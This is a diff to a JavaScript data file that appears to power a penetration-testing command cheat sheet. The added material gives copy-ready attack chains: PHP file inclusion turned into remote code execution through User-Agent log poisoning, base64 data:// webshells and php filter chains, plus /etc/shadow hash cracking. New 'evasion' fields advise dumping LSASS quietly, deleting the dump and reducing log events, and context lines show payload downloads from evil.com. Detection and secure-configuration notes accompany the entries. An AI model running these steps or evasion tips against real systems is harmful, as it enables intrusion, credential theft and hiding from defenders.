-        "artifacts": "Access log: ?language=php://filter/read=convert.base64-encode/resource=config. Response: large base64-encoded string in HTTP response body (decodes to PHP source)."
-      }
+        "artifacts": "Access log: ?language=php://filter/read=convert.base64-encode/resource=config. Response: large base64-encoded string in HTTP response body (decodes to PHP source).",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
+      },
+      "variations": [
+        {
+          "label": "base64-encode source to read PHP",
+          "command": "http://<ip>:<port>/index.php?language=php://filter/convert.base64-encode/resource=<file>"
+        },
+        {
+          "label": "Chain (php_filter_chain) to RCE",
+          "command": "# php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Read PHP source (base64)",
+          "command": "curl -s 'http://<ip>:<port>/index.php?language=php://filter/convert.base64-encode/resource=config' | base64 -d"
+        },
+        {
+          "label": "Find creds/paths, then escalate to RCE (log/session/wrapper)",
+          "command": "# see lfi-log-poisoning / lfi-data-wrapper"
+        }
+      ]
     },
     {
       "id": "lfi-filter-bypass",
@@ -33184,10 +35113,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Non-recursive (....//)",
-          "command": "http://<ip>:<port>/index.php?language=....//....//....//....//etc/passwd"
-        },
-        {
           "label": "URL-encoded",
           "command": "http://<ip>:<port>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64"
         },
@@ -33229,7 +35154,8 @@ const COMMAND_DATA = {
         "why_it_works": "Non-recursive str_replace('../', '', $input) removes the first layer of ../ but leaves the result. Input ....// becomes ../ after one replacement pass. URL encoding (%2e%2e%2f) bypasses string-matching filters operating on decoded values if the filter runs before URL decoding. Double encoding (%252e%252e%252f) bypasses filters that decode once. Approved-path bypass prepends the required prefix then traverses: ./languages/../../../../etc/passwd.",
         "impact": "Bypass server-side input filtering to achieve LFI — these techniques work against developers who attempt to sanitize rather than allowlist. Reaches the same file read impact as basic LFI.",
         "detection": "[MITRE T1083] WAF with normalisation: decode URL encoding, then normalise path, then check for traversal — catches all encoding variants. Application: recursive sanitization (while loop) catches non-recursive bypass.",
-        "artifacts": "Access log: encoded traversal patterns (%2e%2e%2f, %252e%252e, ....//). WAF log: multiple bypass attempt variants before successful evasion."
+        "artifacts": "Access log: encoded traversal patterns (%2e%2e%2f, %252e%252e, ....//). WAF log: multiple bypass attempt variants before successful evasion.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -33331,8 +35257,15 @@ const COMMAND_DATA = {
         "why_it_works": "PHP's data:// wrapper (requires allow_url_include=On) treats a URL-embedded string as a file. data://text/plain;base64,BASE64_PAYLOAD decodes the base64 to PHP code and executes it via include(). The attacker embeds a web shell (<?php system($_GET['cmd']); ?>) base64-encoded in the URL parameter — include() executes it as PHP, giving immediate RCE.",
         "impact": "Remote code execution without any file upload — the payload is delivered entirely in the URL. No interaction with the filesystem required. Full OS command execution as the web server user.",
         "detection": "[MITRE T1505.003] WAF: data:// or data%3A%2F%2F in parameters. PHP config: allow_url_include = Off blocks this entirely — this is the primary prevention. Log: data:// in include() parameter.",
-        "artifacts": "Access log: ?language=data://text/plain;base64,...&cmd=id. PHP error log: if allow_url_include is Off, include() fails with error."
-      }
+        "artifacts": "Access log: ?language=data://text/plain;base64,...&cmd=id. PHP error log: if allow_url_include is Off, include() fails with error.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
+      },
+      "variations": [
+        {
+          "label": "base64 data wrapper",
+          "command": "curl -s 'http://<ip>:<port>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==&0=id'"
+        }
+      ]
     },
     {
       "id": "lfi-expect-wrapper",
@@ -33419,7 +35352,8 @@ const COMMAND_DATA = {
         "why_it_works": "PHP's expect:// wrapper (from the PHP expect extension) executes OS commands and returns their output. expect://id passes 'id' to the shell and returns the output — directly achieving RCE without a webshell file. Requires the PHP expect extension to be installed and loaded (rare on modern servers).",
         "impact": "Direct OS command execution via URL parameter — the simplest possible RCE if expect is enabled. No file creation, no base64 encoding, no allow_url_include required.",
         "detection": "[MITRE T1505.003] WAF: expect:// in URL parameters. PHP config: disable expect extension (remove extension=expect.so from php.ini). Log: expect:// in include() parameter.",
-        "artifacts": "Access log: ?language=expect://id or expect://whoami. PHP module list (phpinfo()): expect listed as loaded extension if enabled."
+        "artifacts": "Access log: ?language=expect://id or expect://whoami. PHP module list (phpinfo()): expect listed as loaded extension if enabled.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -33513,7 +35447,8 @@ const COMMAND_DATA = {
         "why_it_works": "PHP's file inclusion executes any included file as PHP regardless of file extension or magic bytes — if the file contains PHP tags, they execute. GIF8 magic bytes + PHP code creates a file that passes GIF validation (magic byte check) but executes as PHP when included. The attacker uploads 'shell.gif' to an upload function, then includes it via LFI. Extension/MIME filters see GIF; include() executes the PHP.",
         "impact": "RCE via upload+LFI chain — converts a file upload that seemingly filters execution (only allowing images) into code execution. The upload just needs to reach the filesystem; the LFI provides the execution vector.",
         "detection": "[MITRE T1505.003] File integrity monitoring: PHP code (<? strings) in uploaded image files. Content inspection: scan uploaded files for PHP tags regardless of extension. Antivirus on upload directory. Application: include() should never reference user-uploaded paths.",
-        "artifacts": "Upload directory: shell.gif containing GIF8<?php...?>. Access log: include of profile_images/shell.gif with &cmd= parameter. Web server: PHP execution of GIF file."
+        "artifacts": "Upload directory: shell.gif containing GIF8<?php...?>. Access log: include of profile_images/shell.gif with &cmd= parameter. Web server: PHP execution of GIF file.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -33607,7 +35542,8 @@ const COMMAND_DATA = {
         "why_it_works": "PHP's phar:// wrapper reads PHP Archive files. The attacker creates a .phar containing a PHP webshell, renames it .jpg, uploads it, then includes phar://./uploads/shell.jpg/shell.txt. The phar:// wrapper extracts and executes the embedded PHP code regardless of the outer extension. Requires phar.readonly=0 in php.ini.",
         "impact": "RCE via PHAR upload — bypasses extension allowlists. Also relevant for PHAR deserialization attacks (phar:// can trigger __destruct via object deserialization when used with file operations like file_exists).",
         "detection": "[MITRE T1505.003] Content inspection: PHAR magic bytes (__HALT_COMPILER) in uploaded files. WAF: phar:// in URL parameters. PHP config: phar.readonly = 1 (default) prevents creating PHARs but doesn't block reading them.",
-        "artifacts": "Upload directory: .jpg file containing __HALT_COMPILER PHAR stub. Access log: phar://./uploads/... in parameter."
+        "artifacts": "Upload directory: .jpg file containing __HALT_COMPILER PHAR stub. Access log: phar://./uploads/... in parameter.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -33690,7 +35626,8 @@ const COMMAND_DATA = {
         "why_it_works": "PHP stores session data in /var/lib/php/sessions/sess_PHPSESSID. If any user-controlled value is stored in $_SESSION (e.g., $_SESSION['page'] = $_GET['language']), injecting PHP code via that parameter writes it into the session file. The session file path is predictable from the PHPSESSID cookie. Including the session file via LFI executes the stored PHP code.",
         "impact": "RCE via session file — no log access required. Works when logs are not accessible via LFI but session files are (world-readable in default PHP configurations). Provides a private per-session execution channel.",
         "detection": "[MITRE T1505.003] PHP session file: PHP code in session data file (detectable by monitoring /var/lib/php/sessions/ with FIM). open_basedir = /var/www blocks access to session files outside web root. Never store user-controlled values in session without sanitization.",
-        "artifacts": "Session file (/var/lib/php/sessions/sess_*): contains PHP code in a session variable. Access log: include of /var/lib/php/sessions/sess_... with &cmd=."
+        "artifacts": "Session file (/var/lib/php/sessions/sess_*): contains PHP code in a session variable. Access log: include of /var/lib/php/sessions/sess_... with &cmd=.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -33784,7 +35721,8 @@ const COMMAND_DATA = {
         "why_it_works": "php://input (requires allow_url_include=On) references the raw HTTP POST body as a file. When passed to include(), PHP executes the POST body as PHP code. The attacker POSTs a PHP webshell in the request body and includes it via php://input — no URL parameter length limits, no file upload required.",
         "impact": "RCE via POST body — bypasses URL-length limits for payload delivery. POST bodies are often less scrutinised by WAFs than GET parameters. Requires allow_url_include=On.",
         "detection": "[MITRE T1505.003] WAF: php://input in GET parameter while POST body contains PHP code. PHP config: allow_url_include = Off blocks this. Log: POST request to LFI endpoint with PHP code in body.",
-        "artifacts": "Access log: POST to ?language=php://input. Application server: POST body containing <?php system(...) ?> — logged if POST body logging enabled."
+        "artifacts": "Access log: POST to ?language=php://input. Application server: POST body containing <?php system(...) ?> — logged if POST body logging enabled.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -33871,8 +35809,29 @@ const COMMAND_DATA = {
         "why_it_works": "Apache/Nginx logs every request including the User-Agent header in plaintext. If the attacker sets User-Agent: <?php system($_GET['cmd']); ?>, this PHP code is written into access.log. When the vulnerable LFI parameter includes the log file (/var/log/apache2/access.log), PHP executes the poisoned log entry — the cmd parameter controls the command. PHP session files (sess_PHPSESSID in /var/lib/php/sessions/) work the same way if user-controlled values are stored in the session.",
         "impact": "RCE via log poisoning — achieves code execution without any file upload, just HTTP request manipulation. Persistent until the log rotates. Works even when PHP wrappers are disabled (data://, expect:// blocked) as long as LFI exists and the log is readable.",
         "detection": "[MITRE T1505.003] WAF/IDS: PHP code in User-Agent header (<?php, system(, passthru(). Log analysis: PHP tags appearing in access.log User-Agent field. File permissions: web server should not have read access to its own logs via PHP (open_basedir prevents this). IDS: malformed User-Agent strings containing function calls.",
-        "artifacts": "access.log: entry with PHP code in User-Agent field. Web access log (from poisoning phase): GET to any page with PHP User-Agent. Web access log (execution phase): include of /var/log/apache2/access.log with &cmd= parameter."
-      }
+        "artifacts": "access.log: entry with PHP code in User-Agent field. Web access log (from poisoning phase): GET to any page with PHP User-Agent. Web access log (execution phase): include of /var/log/apache2/access.log with &cmd= parameter.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
+      },
+      "variations": [
+        {
+          "label": "SSH auth.log poisoning",
+          "command": "ssh '<?php system($_GET[0]); ?>'@<ip>   # then include /var/log/auth.log"
+        },
+        {
+          "label": "Apache access log via User-Agent",
+          "command": "curl -s http://<ip>/ -H 'User-Agent: <?php system($_GET[0]); ?>'"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Poison a log with PHP via User-Agent",
+          "command": "curl -s 'http://<ip>:<port>/index.php' -H 'User-Agent: <?php system($_GET[0]); ?>'"
+        },
+        {
+          "label": "Include the log to execute",
+          "command": "curl -s 'http://<ip>:<port>/index.php?language=/var/log/apache2/access.log&0=id'"
+        }
+      ]
     },
     {
       "id": "lfi-zip-wrapper",
@@ -33965,7 +35924,8 @@ const COMMAND_DATA = {
         "why_it_works": "PHP's zip:// wrapper reads files from inside a ZIP archive. The attacker creates shell.jpg (actually a ZIP containing shell.php), uploads it, then includes zip://./uploads/shell.jpg%23shell.php — the %23 is # which specifies the file inside the ZIP to include. PHP executes the enclosed shell.php. Extension filtering sees .jpg; zip:// extracts and executes the inner PHP file.",
         "impact": "RCE via ZIP upload — bypasses extension allowlists by hiding PHP inside a ZIP with a permitted extension. Combined with LFI, achieves code execution.",
         "detection": "[MITRE T1505.003] Content inspection: detect ZIP magic bytes (PK\\x03\\x04) in files with non-ZIP extensions. WAF: zip:// wrapper in include parameters. Application: never pass user-controlled paths to include().",
-        "artifacts": "Upload directory: shell.jpg with ZIP magic bytes (detectable by file command). Access log: zip://./uploads/shell.jpg%23shell.php in parameter."
+        "artifacts": "Upload directory: shell.jpg with ZIP magic bytes (detectable by file command). Access log: zip://./uploads/shell.jpg%23shell.php in parameter.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -34042,7 +36002,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "unshadow merges /etc/passwd and /etc/shadow into a crackable file so the hashes can be attacked with John/hashcat.",
+        "why_it_works": "/etc/shadow holds salted password hashes; combined with /etc/passwd, John/hashcat crack them offline — feasible when users pick weak passwords.",
         "prerequisites": "Root/read access to /etc/shadow on the Linux target.",
         "impact": "A crackable hash file of local Linux account passwords.",
         "detection": "[MITRE T1003.008] Reads of /etc/shadow by a non-root or unexpected process (auditd on /etc/shadow); shadow requires root, so access itself is the signal.",
@@ -34054,9 +36014,30 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Credential material is accessible in multiple locations: SAM/NTDS.DIT via registry hives or VSS, LSASS minidump via Task Manager (non-admin on some configs), cached credentials in Windows Credential Manager (cmdkey), /etc/shadow readable by non-root. Offline attacks succeed because credentials are stored with weak hashing algorithms.",
         "vulnerable_config": "# Windows Credential Manager stores cleartext/encrypted creds:\ncmdkey /list\n# Manages: Domain:interactive=CORP\\svcaccount  (recoverable with DPAPI)\n\n# /etc/shadow accessible (bad permissions):\nls -la /etc/shadow  # -rw-r--r-- 1 root shadow (group-readable)\n# SHA-512 hashes: crackable with hashcat -m 1800",
-        "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)"
+        "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)",
+        "evasion": "Dump LSASS to a file with a LOLBAS (comsvcs.dll MiniDump) or an evasive tool (nanodump) and PARSE OFFLINE so Mimikatz never runs on the host; bypass/►check RunAsPPL first; delete the .dmp after; for DCSync prefer -just-dc-user krbtgt over a full dump to touch fewer objects and generate one 4662 instead of many."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Crack with John",
+          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.hashes"
+        },
+        {
+          "label": "hashcat (sha512crypt m1800)",
+          "command": "hashcat -m 1800 unshadowed.hashes /usr/share/wordlists/rockyou.txt"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Combine passwd + shadow",
+          "command": "unshadow /etc/passwd /etc/shadow > unshadowed.hashes"
+        },
+        {
+          "label": "Crack offline",
+          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.hashes"
+        }
+      ]
     },
     {
       "id": "linux-domain-check",
@@ -34086,10 +36067,6 @@ const COMMAND_DATA = {
         "domain-join"
       ],
       "variations": [
-        {
-          "label": "Check domain membership",
-          "command": "realm list"
-        },
         {
           "label": "Spot the auth daemon (SSSD / winbind)",
           "command": "ps -ef | grep -iE 'winbind|sssd'"
@@ -34155,7 +36132,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Credentials are stored in plaintext in browser saved passwords, application config files, scripts, log files, and SMB shares. Network captures contain cleartext protocol credentials (FTP, HTTP Basic, LDAP simple bind). No DLP (Data Loss Prevention) monitoring prevents credential exfiltration.",
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
-        "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
+        "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud",
+        "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
       }
     },
     {
@@ -34322,7 +36300,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "MimiPenguin scrapes cleartext credentials from the memory of Linux processes (e.g. gdm, sshd, sudo) and known files.",
+        "why_it_works": "Linux processes (GDM, sshd, sudo) can retain the plaintext password in memory during a session; mimipenguin scrapes those regions.",
         "prerequisites": "Root on the Linux target.",
         "impact": "Cleartext Linux/user credentials from process memory.",
         "detection": "[MITRE T1003.008] reads of process memory (/proc/*/maps,mem) by a non-standard tool; root context; MimiPenguin signature.",
@@ -34334,7 +36312,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Credentials are stored in plaintext in browser saved passwords, application config files, scripts, log files, and SMB shares. Network captures contain cleartext protocol credentials (FTP, HTTP Basic, LDAP simple bind). No DLP (Data Loss Prevention) monitoring prevents credential exfiltration.",
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
-        "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
+        "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud",
+        "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
       },
       "type": "command"
     },
@@ -34432,7 +36411,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "AD-integrated Linux hosts cache domain users' Kerberos tickets and keytabs on disk (SSSD ccache DBs, /etc/krb5.keytab, world-readable /tmp/krb5cc_* in some setups), and any root-level compromise exposes every cached domain credential. Long ticket lifetimes and shared multi-user Linux jump hosts widen the blast radius.",
         "vulnerable_config": "# SSSD caching credentials/tickets on disk:\n# /etc/sssd/sssd.conf\n[domain/inlanefreight.htb]\ncache_credentials = True\nkrb5_store_password_if_offline = True\n# ccache DBs readable by root: /var/lib/sss/db/ccache_INLANEFREIGHT.HTB\n# machine keytab: /etc/krb5.keytab (root-readable)\n\n# Long ticket lifetimes in /etc/krb5.conf:\n[libdefaults]\n  ticket_lifetime = 24h\n  renew_lifetime = 7d",
-        "secure_config": "# Minimise on-disk credential/ticket caching:\n# /etc/sssd/sssd.conf\n[domain/inlanefreight.htb]\ncache_credentials = False\nkrb5_store_password_if_offline = False\n\n# Shorten Kerberos ticket lifetimes (/etc/krb5.conf):\n[libdefaults]\n  ticket_lifetime = 4h\n  renew_lifetime = 1d\n\n# Lock down access:\n# - Restrict root/sudo; monitor with auditd on /var/lib/sss/db, /etc/krb5.keytab, /tmp/krb5cc_*\n# - Do not use shared multi-user Linux hosts as domain jump boxes\n# - EDR on /proc/*/mem reads by non-standard binaries"
+        "secure_config": "# Minimise on-disk credential/ticket caching:\n# /etc/sssd/sssd.conf\n[domain/inlanefreight.htb]\ncache_credentials = False\nkrb5_store_password_if_offline = False\n\n# Shorten Kerberos ticket lifetimes (/etc/krb5.conf):\n[libdefaults]\n  ticket_lifetime = 4h\n  renew_lifetime = 1d\n\n# Lock down access:\n# - Restrict root/sudo; monitor with auditd on /var/lib/sss/db, /etc/krb5.keytab, /tmp/krb5cc_*\n# - Do not use shared multi-user Linux hosts as domain jump boxes\n# - EDR on /proc/*/mem reads by non-standard binaries",
+        "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
       },
       "type": "command"
     },
@@ -34491,10 +36471,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Config Keywords",
-          "command": "for i in $(find / -name *.cnf 2>/dev/null | grep -v 'doc\\|lib'); do echo -e \"\\nFile: \" $i; grep 'user\\|password\\|pass' $i 2>/dev/null | grep -v '\\#'; done"
-        },
-        {
           "label": "Config Files",
           "command": "for l in $(echo \".conf .config .cnf\");do find / -name *$l 2>/dev/null | grep -v \"lib\\|fonts\\|share\\|core\";done"
         },
@@ -34521,7 +36497,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "grep/find sweeps Linux files (configs, history, keys, /var) for passwords, tokens, and private keys.",
+        "why_it_works": "Config files, history files, and scripts on Linux frequently embed DB/service passwords in cleartext; grepping common locations finds them.",
         "prerequisites": "A shell on the Linux target.",
         "impact": "Cleartext credentials, API tokens, and SSH keys from the filesystem.",
         "detection": "[MITRE T1552.001] grep/find with credential keywords in auditd; bulk reads of sensitive files.",
@@ -34637,7 +36613,7 @@ const COMMAND_DATA = {
         },
         {
           "label": "kinit from keytab",
-          "command": "kinit <user>@<REALM> -k -t <file.keytab>"
+          "command": "kinit <user>@<REALM> -k -t <keytab>"
         },
         {
           "label": "SMB with Kerberos",
@@ -34645,7 +36621,7 @@ const COMMAND_DATA = {
         },
         {
           "label": "Convert ccache to kirbi",
-          "command": "impacket-ticketConverter <ccache> <output.kirbi>"
+          "command": "impacket-ticketConverter <ccache> <ticket>"
         }
       ],
       "opsec": "loud",
@@ -34654,7 +36630,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "On Linux, a Kerberos ccache (KRB5CCNAME) is set so tools (impacket -k, etc.) authenticate with a stolen/forged ticket.",
+        "why_it_works": "Impacket honours the KRB5CCNAME ccache; a stolen/forged ticket in that file lets the tools authenticate over Kerberos as the ticket's user without a password.",
         "prerequisites": "A valid/forged ccache/.kirbi and a Linux attacker host.",
         "impact": "Authenticated access to AD services as the ticket's principal from Linux.",
         "detection": "[MITRE T1550.003] Anomalous Kerberos activity: a TGS used without a preceding TGT the DC issued; tickets with unusual lifetimes/encryption (RC4 where AES is standard); 4768/4769 anomalies; a ticket used from an unexpected host.",
@@ -34842,7 +36818,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Uploading data off a Linux target (curl -F, an attacker web/nc listener, scp) exfiltrates loot over a non-C2 channel.",
+        "why_it_works": "Standard Linux transfer tools (scp/wget/curl over SSH/HTTP) move files onto the target using access you already have; there's no vuln — it's living-off-the-land staging.",
         "prerequisites": "Code execution on the target, data to exfil, and an attacker endpoint reachable over an allowed protocol.",
         "impact": "Sensitive files leave the environment - a confidentiality breach and material for offline analysis.",
         "detection": "Outbound data flows to an external/unknown host, unusual for the source process; DLP/egress monitoring on sensitive content; command line (curl -F / nc) in auditd.",
@@ -34855,7 +36831,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
